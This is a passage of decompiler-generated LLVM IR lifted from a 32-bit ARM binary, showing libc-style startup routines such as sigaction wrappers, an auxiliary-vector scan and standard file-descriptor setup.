  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_14c24 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_14c24 = call i32 @function_1545c(%timespec* %v2_14c24, i32 %storemerge.pre-phi)
  store i32 %v3_14c24, i32* %r0.global-to-local, align 4
  store i32 %v3_14c24, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14c2c

dec_label_pc_14c2c:                               ; preds = %dec_label_pc_14bd0, %dec_label_pc_14c20
  %v0_14c2c = phi i32 [ %v0_14c2c.pr, %dec_label_pc_14bd0 ], [ %v3_14c24, %dec_label_pc_14c20 ]
  %v2_14c2c = icmp eq i32 %v0_14c2c, 0
  br i1 %v2_14c2c, label %dec_label_pc_14c50, label %dec_label_pc_14c34

dec_label_pc_14c34:                               ; preds = %dec_label_pc_14c2c
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_14c3c = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_14c3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c5c

dec_label_pc_14c50:                               ; preds = %dec_label_pc_14ac4, %dec_label_pc_14c2c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c5c

dec_label_pc_14c58:                               ; preds = %dec_label_pc_14b18, %dec_label_pc_14b68, %dec_label_pc_14af4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c5c

dec_label_pc_14c5c:                               ; preds = %dec_label_pc_14c34, %dec_label_pc_14c50, %dec_label_pc_14b94, %dec_label_pc_14c58
  %v17_14c60 = phi i32 [ %v3_14c3c, %dec_label_pc_14c34 ], [ 0, %dec_label_pc_14c50 ], [ %v17_14c60.pre, %dec_label_pc_14b94 ], [ -1, %dec_label_pc_14c58 ]
  %v2_14c60 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14c60, i32* @r4, align 4
  store i32 %v6_14ac4, i32* @r5, align 4
  store i32 %v9_14ac4, i32* @r6, align 4
  ret i32 %v17_14c60

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_14bc8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_14b58, { 0, 2, 1 }
  uselistorder i32 %v2_14b18, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_14b10, { 1, 0, 2 }
  uselistorder i32 %v1_14ae4, { 0, 2, 1 }
  uselistorder i32 %v16_14ac4, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 7, 6, 9, 8, 20, 10, 12, 13, 11, 15, 14, 16, 22, 17, 21, 18, 19, 1 }
  uselistorder i32 (i32, i32*, i32)* @function_14fc0, { 1, 2, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @function_13918, { 1, 2, 3, 4, 0 }
  uselistorder i32 ()* @function_140f8, { 2, 1, 0, 3, 4 }
  uselistorder i32 -136, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14c5c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_14c58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c50, { 1, 0 }
  uselistorder label %dec_label_pc_14c2c, { 1, 0 }
  uselistorder label %dec_label_pc_14c20, { 1, 0 }
  uselistorder label %dec_label_pc_14b50, { 1, 0 }
  uselistorder label %dec_label_pc_14adc, { 1, 0 }
}

define i32 @function_14c68(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c94:
  %stack_var_-8 = alloca i32, align 4
  %v3_14c68 = load i32, i32* @r4, align 4
  store i32 %v3_14c68, i32* %stack_var_-8, align 4
  %v2_14c98 = load i32, i32* @global_var_1eca0.662, align 4
  %v2_14c9c = icmp eq i32 %v2_14c98, 0
  br i1 %v2_14c9c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14c94
  call void @__pseudo_branch(i32 %v2_14c98)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14c94, %bb
  %v2_14cac = load i32, i32* @global_var_1eca4.664, align 4
  %v2_14cb0 = icmp eq i32 %v2_14cac, 0
  br i1 %v2_14cb0, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_14cb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_14cb4, i32* @r4, align 4
  %v9_14cb4 = load i32, i32* @r0, align 4
  ret i32 %v9_14cb4

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_14cac)
  %v2_14cc0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14cc0, i32* @r4, align 4
  %v8_14cc0 = load i32, i32* @r0, align 4
  ret i32 %v8_14cc0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14cd4() local_unnamed_addr {
dec_label_pc_14cd4:
  ret i32 0
}

define i32 @function_14cdc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14cdc:
  %v1_14cdc = load i32, i32* @r0, align 4
  ret i32 %v1_14cdc
}

define i32 @function_14ce0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14ce0:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14ce0 = load i32, i32* @r4, align 4
  store i32 %v3_14ce0, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_14cf0 = call i32 @function_135ac(i32 %arg1, i32 1)
  %v7_14cf4 = icmp eq i32 %v2_14cf0, -1
  br i1 %v7_14cf4, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14ce0
  %v3_14cf8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_14cf8, i32* @r4, align 4
  ret i32 %v2_14cf0

bb4:                                              ; preds = %dec_label_pc_14ce0
  %v0_14cfc = load i32, i32* @r4, align 4
  %v4_14d04 = call i32 @function_137c8(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_16758.667, i32 0, i32 0), i32 %v0_14cfc)
  %v1_14d08 = load i32, i32* %r5.global-to-local, align 4
  %v9_14d08 = icmp eq i32 %v4_14d04, %v1_14d08
  br i1 %v9_14d08, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_14d0c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_14d0c, i32* @r4, align 4
  ret i32 %v4_14d04

bb6:                                              ; preds = %bb4
  %v0_14d10 = call i32 @function_1473c()
  %v0_14d14 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14d14, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v2_14d14 = load i32, i32* @r8, align 4
  %v3_14d14 = load i32, i32* @r7, align 4
  %v8_14d14 = ashr i32 %v2_14d14, %v3_14d14
  %v9_14d14 = and i32 %v8_14d14, %v0_14cfc
  store i32 %v9_14d14, i32* @r6, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_14d10

; uselistorder directives
  uselistorder i32 %v2_14cf0, { 1, 0 }
  uselistorder i32* @r7, { 286, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 230, 231, 42, 50, 43, 1, 41, 57, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 58, 59, 232, 240, 241, 233, 234, 235, 236, 237, 238, 239, 66, 67, 2, 68, 69, 70, 71, 72, 73, 74, 75, 191, 192, 193, 60, 0, 61, 62, 63, 64, 65, 76, 77, 78, 79, 3, 80, 81, 82, 83, 84, 85, 86, 87, 88, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 4, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285 }
  uselistorder i32* @r8, { 180, 91, 92, 93, 94, 95, 104, 7, 8, 10, 9, 11, 12, 13, 96, 97, 102, 103, 98, 99, 100, 101, 20, 21, 22, 23, 80, 81, 82, 14, 15, 16, 17, 18, 19, 24, 25, 26, 0, 1, 2, 3, 4, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 6, 51, 52, 53, 54, 55, 56, 57, 58, 5, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 83, 84, 85, 86, 87, 88, 89, 90, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 146, 143, 144, 145, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 171, 172, 170, 173, 174, 175, 176, 177, 178, 179 }
  uselistorder i1* @cpsr_z, { 7, 0, 9, 8, 4, 5, 1, 2, 3, 6 }
  uselistorder i32 ()* @function_1473c, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @function_137c8, { 9, 6, 0, 1, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 (i32, i32)* @function_135ac, { 0, 11, 4, 3, 6, 5, 15, 14, 8, 7, 13, 12, 10, 9, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_14d18(i32 %arg1) local_unnamed_addr {
dec_label_pc_14d18:
  %v2_14d1c = load i32, i32* @global_var_1eca8.669, align 4
  %v2_14d20 = icmp eq i32 %v2_14d1c, 0
  br i1 %v2_14d20, label %bb2, label %bb

bb:                                               ; preds = %dec_label_pc_14d18
  %v6_14d2c = load i32, i32* @r0, align 4
  ret i32 %v6_14d2c

bb2:                                              ; preds = %dec_label_pc_14d18
  store i32 1, i32* @global_var_1eca8.669, align 4
  store i32 4096, i32* @global_var_1ec9c.620, align 4
  ret i32 undef
}

define i32 @function_14d74(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14d74:
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_14d78 = mul i32 %arg2, 4
  %v5_14d78 = add i32 %tmp, %v4_14d78
  %v2_14d7c = load i32, i32* %arg3, align 4
  %v2_14d80 = ptrtoint i32* %stack_var_-120 to i32
  %v1_14d84 = add i32 %v5_14d78, 4
  %v9_14d88 = icmp eq i32 %v1_14d84, %v2_14d7c
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg7, i32* @global_var_1ec94.674, align 4
  store i32 %v1_14d84, i32* @global_var_1ec98.676, align 4
  store i32 %arg6, i32* @global_var_1eca4.664, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_14d88, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_14d74
  store i32 %v5_14d78, i32* @global_var_1ec98.676, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_14d74, %bb
  %v2_14dc8 = bitcast i32* %stack_var_-120 to i8*
  %v3_14dc8 = call i32 @function_13cd0(i8* %v2_14dc8, i32 0)
  %storemerge.pre = load i32, i32* @global_var_1ec98.676, align 4
  br label %dec_label_pc_14dd8

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14dd8, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_14dd8, %dec_label_pc_14dd8 ]
  %v1_14dd8 = inttoptr i32 %storemerge to i32*
  %v2_14dd8 = load i32, i32* %v1_14dd8, align 4
  %v4_14dd8 = add i32 %storemerge, 4
  %v2_14ddc = icmp eq i32 %v2_14dd8, 0
  br i1 %v2_14ddc, label %dec_label_pc_14de8, label %dec_label_pc_14dd8

dec_label_pc_14de8:                               ; preds = %dec_label_pc_14dd8
  store i32 %v4_14dd8, i32* @r4, align 4
  %v1_14e0822 = inttoptr i32 %v4_14dd8 to i32*
  %v2_14e0823 = load i32, i32* %v1_14e0822, align 4
  %v2_14e0c25 = icmp eq i32 %v2_14e0823, 0
  br i1 %v2_14e0c25, label %dec_label_pc_14e14, label %dec_label_pc_14df0

dec_label_pc_14df0:                               ; preds = %dec_label_pc_14de8, %dec_label_pc_14e08
  %v5_14df4 = phi i32 [ %v2_14e08, %dec_label_pc_14e08 ], [ %v2_14e0823, %dec_label_pc_14de8 ]
  %v2_14df0 = icmp ugt i32 %v5_14df4, 13
  %v7_14df0 = icmp eq i32 %v5_14df4, 14
  %v2_14df4 = xor i1 %v2_14df0, true
  %v3_14df4 = or i1 %v7_14df0, %v2_14df4
  br i1 %v3_14df4, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_14df0
  %v6_14df4 = and i32 %v5_14df4, 536870912
  %v7_14df4 = icmp ne i32 %v6_14df4, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_14df0, %bb42
  %v1_14e00 = phi i1 [ %v2_14df0, %dec_label_pc_14df0 ], [ %v7_14df4, %bb42 ]
  %v2_14df8 = xor i1 %v1_14e00, true
  %v3_14df8 = or i1 %v7_14df0, %v2_14df8
  br i1 %v3_14df8, label %bb44, label %dec_label_pc_14e08

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_14e08

dec_label_pc_14e08:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_14df8, i32 ptrtoint (i32* @global_var_13cb0.678 to i32))
  %v0_14e04 = load i32, i32* @r4, align 4
  %v1_14e04 = add i32 %v0_14e04, 8
  store i32 %v1_14e04, i32* @r4, align 4
  %v1_14e08 = inttoptr i32 %v1_14e04 to i32*
  %v2_14e08 = load i32, i32* %v1_14e08, align 4
  %v2_14e0c = icmp eq i32 %v2_14e08, 0
  br i1 %v2_14e0c, label %dec_label_pc_14e14, label %dec_label_pc_14df0

dec_label_pc_14e14:                               ; preds = %dec_label_pc_14e08, %dec_label_pc_14de8
  %v1_14e18 = call i32 @function_15e6c(i32 %v2_14d80)
  store i32 %v1_14e18, i32* @r0, align 4
  %v1_14e1c = call i32 @function_14d18(i32 %v1_14e18)
  store i32 %v1_14e1c, i32* @r0, align 4
  %v2_14e28 = icmp eq i32 %tmp37, 0
  br i1 %v2_14e28, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_14e14
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_14e14, %bb45
  %v0_14e38 = phi i32 [ %tmp37, %dec_label_pc_14e14 ], [ 4096, %bb45 ]
  %v3_14e30 = icmp eq i32 %tmp36, -1
  %v8_14e30 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_1ec9c.620 to i32), i32* @r2, align 4
  store i32 %v0_14e38, i32* @global_var_1ec9c.620, align 4
  br i1 %v3_14e30, label %dec_label_pc_14e40, label %dec_label_pc_14e68

dec_label_pc_14e40:                               ; preds = %bb46
  %v0_14e40 = call i32 @function_153cc()
  store i32 %v0_14e40, i32* @r0, align 4
  store i32 %v0_14e40, i32* @r4, align 4
  %v0_14e48 = call i32 @function_15374()
  %v0_14e4c = load i32, i32* @r4, align 4
  %v9_14e4c = icmp eq i32 %v0_14e4c, %v0_14e48
  br i1 %v9_14e4c, label %dec_label_pc_14e54, label %dec_label_pc_14e90

dec_label_pc_14e54:                               ; preds = %dec_label_pc_14e40
  %v1_14e54 = call i32 @function_153a0(i32 %v0_14e48)
  store i32 %v1_14e54, i32* @r0, align 4
  store i32 %v1_14e54, i32* @r4, align 4
  %v0_14e5c = call i32 @function_15348()
  %v0_14e60 = load i32, i32* @r4, align 4
  %v9_14e60 = icmp eq i32 %v0_14e60, %v0_14e5c
  br i1 %v9_14e60, label %dec_label_pc_14e68, label %dec_label_pc_14e90

dec_label_pc_14e68:                               ; preds = %dec_label_pc_14e54, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_14e30, label %dec_label_pc_14efc, label %dec_label_pc_14e74

dec_label_pc_14e74:                               ; preds = %dec_label_pc_14e68
  %v9_14e78 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_14e78, label %dec_label_pc_14e80, label %dec_label_pc_14e90

dec_label_pc_14e80:                               ; preds = %dec_label_pc_14e74
  br label %dec_label_pc_14e90

dec_label_pc_14e90:                               ; preds = %dec_label_pc_14e80, %dec_label_pc_14e74, %dec_label_pc_14e54, %dec_label_pc_14e40
  %v2_14e98 = call i32 @function_14ce0(i32 0, i32 32768)
  %v2_14ea4 = call i32 @function_14ce0(i32 1, i32 32770)
  %v2_14eb0 = call i32 @function_14ce0(i32 2, i32 32770)
  br label %dec_label_pc_14efc

dec_label_pc_14efc:                               ; preds = %dec_label_pc_14e90, %dec_label_pc_14e68
  %v0_14ec0 = load i32, i32* @r6, align 4
  %v1_14ec0 = inttoptr i32 %v0_14ec0 to i32*
  %v2_14ec0 = load i32, i32* %v1_14ec0, align 4
  store i32 %v2_14ec0, i32* @global_var_1ebd4, align 4
  store i32 %arg5, i32* @global_var_1eca0.662, align 4
  %v2_14efc = icmp eq i32 %arg4, 0
  br i1 %v2_14efc, label %dec_label_pc_14f38, label %bb47

bb47:                                             ; preds = %dec_label_pc_14efc
  br label %dec_label_pc_14f38

dec_label_pc_14f38:                               ; preds = %dec_label_pc_14efc, %bb47
  call void @__pseudo_branch(i32 %arg4)
  %v1_14f48 = call i32 @function_13c70()
  %v2_14f50 = inttoptr i32 %v1_14f48 to i32*
  store i32 0, i32* %v2_14f50, align 4
  %v0_14f7c = load i32, i32* %r8.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_14f88 = call i32 @function_14a30(i32 %v0_14f7c)
  ret i32 %v1_14f88

; uselistorder directives
  uselistorder i32 %v2_14e08, { 1, 0 }
  uselistorder i32 %v1_14e04, { 1, 0 }
  uselistorder i1 %v2_14df0, { 1, 0 }
  uselistorder i32 %v4_14dd8, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @function_14a30, { 0, 7, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_14ce0, { 2, 1, 0 }
  uselistorder i32 32768, { 1, 2, 0 }
  uselistorder i32* @global_var_1ec9c.620, { 1, 4, 0, 2, 3 }
  uselistorder i32 4096, { 0, 1, 5, 9, 3, 4, 6, 7, 2, 8, 10, 11 }
  uselistorder i32 536870912, { 1, 0, 2 }
  uselistorder i1 true, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 49, 9, 10, 11, 12, 13, 17, 18, 19, 76, 77, 78, 79, 68, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 20, 21, 96, 97, 98, 50, 67, 15, 16, 66, 14, 99, 33, 32, 55, 61, 56, 62, 53, 60, 54, 65, 100, 22, 101, 102, 23, 24, 25, 103, 69, 70, 26, 27, 104, 71, 72, 28, 29, 105, 73, 74, 30, 31, 52, 106, 107, 63, 108, 34, 57, 35, 36, 51, 37, 38, 39, 109, 110, 111, 112, 58, 113, 114, 115, 116, 117, 118, 119, 120, 44, 121, 45, 46, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 43, 136, 137, 138, 139, 140, 141, 42, 142, 48, 143, 59, 64, 47, 144, 40, 41, 75, 145 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_14f38, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_14e08, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_14df0, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @function_14fc0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14fc0:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_14fc0 = load i32, i32* @r4, align 4
  %v6_14fc0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_14fc4 = icmp eq i32* %arg2, null
  %v2_14fc8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_14fc4, label %dec_label_pc_15034, label %dec_label_pc_14fd8

dec_label_pc_14fd8:                               ; preds = %dec_label_pc_14fc0
  %v2_14fdc = load i32, i32* %arg2, align 4
  %v4_14fdc = add i32 %tmp, 4
  store i32 %v4_14fdc, i32* @r1, align 4
  %v2_14fe0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_14fe0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_14fdc, i32* %stack_var_-156, align 4
  %v3_14fec = call i32 @function_13cb0(i32 %v2_14fe0, i32 %v4_14fdc, i32 128)
  store i32 %v3_14fec, i32* %r0.global-to-local, align 4
  %v0_14ff0 = load i32, i32* @r4, align 4
  %v1_14ff0 = add i32 %v0_14ff0, 132
  %v2_14ff0 = inttoptr i32 %v1_14ff0 to i32*
  %v3_14ff0 = load i32, i32* %v2_14ff0, align 4
  %v1_14ff4 = and i32 %v3_14ff0, 67108864
  %v2_14ff4 = icmp eq i32 %v1_14ff4, 0
  br i1 %v2_14ff4, label %dec_label_pc_15008, label %bb

bb:                                               ; preds = %dec_label_pc_14fd8
  br label %dec_label_pc_15024

dec_label_pc_15008:                               ; preds = %dec_label_pc_14fd8
  %v1_15010 = and i32 %v3_14ff0, 4
  %v2_15010 = icmp eq i32 %v1_15010, 0
  br i1 %v2_15010, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_15008
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_15008, %bb20
  br label %dec_label_pc_15024

dec_label_pc_15024:                               ; preds = %bb, %bb21
  %v2_15024 = icmp eq i32 %v0_14ff0, 0
  %v3_15028 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_15028 = select i1 %v2_15024, i32 0, i32 %v3_15028
  %v0_15034.pre = load i32, i32* @r5, align 4
  %v0_15044.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15034

dec_label_pc_15034:                               ; preds = %dec_label_pc_15024, %dec_label_pc_14fc0
  %v0_15044 = phi i32 [ %arg1, %dec_label_pc_14fc0 ], [ %v0_15044.pre, %dec_label_pc_15024 ]
  %v0_15034 = phi i32 [ %arg3, %dec_label_pc_14fc0 ], [ %v0_15034.pre, %dec_label_pc_15024 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_14fc0 ], [ %.v3_15028, %dec_label_pc_15024 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_15034 = icmp eq i32 %v0_15034, 0
  %.v2_14fc8 = select i1 %v2_15034, i32 0, i32 %v2_14fc8
  store i32 %.v2_14fc8, i32* @r2, align 4
  store i32 %v0_15044, i32* %r0.global-to-local, align 4
  %v1_15048 = call i32 @function_150ac(i32 %v0_15044)
  store i32 %v1_15048, i32* %r0.global-to-local, align 4
  %v0_1504c = load i32, i32* @r5, align 4
  %v2_1504c = icmp eq i32 %v0_1504c, 0
  br i1 %v2_1504c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_15034
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_15034, %bb25
  %v0_1505c.pr = phi i32 [ 0, %dec_label_pc_15034 ], [ 1, %bb25 ]
  %v1_15054 = icmp slt i32 %v1_15048, 0
  br i1 %v1_15054, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_15090

thread-pre-split:                                 ; preds = %bb26
  %v2_1505c = icmp eq i32 %v0_1505c.pr, 0
  store i32 %v1_15048, i32* @r4, align 4
  br i1 %v2_1505c, label %dec_label_pc_15090, label %dec_label_pc_15068

dec_label_pc_15068:                               ; preds = %thread-pre-split
  %v2_15068 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_1504c, i32* %r0.global-to-local, align 4
  %v2_15070 = inttoptr i32 %v0_1504c to i32*
  store i32 %v2_15068, i32* %v2_15070, align 4
  %v3_15070 = load i32, i32* %r0.global-to-local, align 4
  %v4_15070 = add i32 %v3_15070, 4
  store i32 %v4_15070, i32* @r0, align 4
  %v2_15074 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_15074, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v3_1507c = call i32 @function_13cb0(i32 %v4_15070, i32 %v2_15074, i32 128)
  store i32 %v3_1507c, i32* %r0.global-to-local, align 4
  %v1_15084 = load i32, i32* @r5, align 4
  %v2_15084 = add i32 %v1_15084, 136
  %v3_15084 = inttoptr i32 %v2_15084 to i32*
  %v1_1508c = load i32, i32* @r5, align 4
  %v2_1508c = add i32 %v1_1508c, 132
  %v3_1508c = inttoptr i32 %v2_1508c to i32*
  %v0_15090.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15090

dec_label_pc_15090:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_15068
  %v0_15090 = phi i32 [ %v1_15048, %thread-pre-split ], [ %v0_15090.pre, %dec_label_pc_15068 ], [ %v1_15048, %thread-pre-split.thread ]
  store i32 %v0_15090, i32* %r0.global-to-local, align 4
  store i32 %v3_14fc0, i32* @r4, align 4
  store i32 %v6_14fc0, i32* @r5, align 4
  ret i32 %v0_15090

; uselistorder directives
  uselistorder i32 %v0_15090, { 1, 0 }
  uselistorder i32 %v0_1504c, { 1, 0, 2 }
  uselistorder i32 %v0_15044, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 4, 5, 2, 7, 1, 0 }
  uselistorder label %dec_label_pc_15090, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_15024, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_150ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_150ac:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_150ac = load i32, i32* @r4, align 4
  store i32 %v3_150ac, i32* %stack_var_-8, align 4
  %v1_150b0 = load i32, i32* @r1, align 4
  %v2_150b0 = inttoptr i32 %v1_150b0 to %sigaction*
  %v3_150b0 = load i32, i32* @r2, align 4
  %v4_150b0 = inttoptr i32 %v3_150b0 to %sigaction*
  %v5_150b0 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_150b0, %sigaction* %v4_150b0)
  store i32 %v5_150b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_150b0, -4095
  br i1 %tmp, label %dec_label_pc_150d0, label %dec_label_pc_150c0

dec_label_pc_150c0:                               ; preds = %dec_label_pc_150ac
  %v0_150c0 = call i32 @function_13c70()
  %v0_150c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_150c4 = sub i32 0, %v0_150c4
  %v2_150c8 = inttoptr i32 %v0_150c0 to i32*
  store i32 %v1_150c4, i32* %v2_150c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_150d0

dec_label_pc_150d0:                               ; preds = %dec_label_pc_150ac, %dec_label_pc_150c0
  %v0_150d0 = phi i32 [ %v5_150b0, %dec_label_pc_150ac ], [ -1, %dec_label_pc_150c0 ]
  %v2_150d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_150d4, i32* %r4.global-to-local, align 4
  ret i32 %v0_150d0

; uselistorder directives
  uselistorder i32 %v5_150b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_150d0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_150d8(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_150d8:
